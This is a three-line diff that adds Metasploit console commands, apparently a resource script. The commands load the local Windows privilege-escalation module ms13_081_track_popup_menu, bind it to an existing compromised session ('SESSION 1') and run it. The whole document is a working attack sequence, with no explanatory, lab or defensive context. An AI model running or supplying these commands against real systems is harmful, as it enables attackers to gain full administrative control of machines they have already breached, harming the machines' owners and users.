@@ -1,0 +1,3 @@
+use exploit/windows/local/ms13_081_track_popup_menu
+set SESSION 1
+exploit
